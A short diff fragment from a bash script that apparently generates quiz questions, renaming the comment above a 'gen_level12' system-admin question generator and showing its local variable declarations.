   printf '%s\n' "${questions[@]}"
 }
 
-# Level 2: System Admin (daily drivers)
+# Level 12: System Admin
 gen_level12() {
   local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx
 
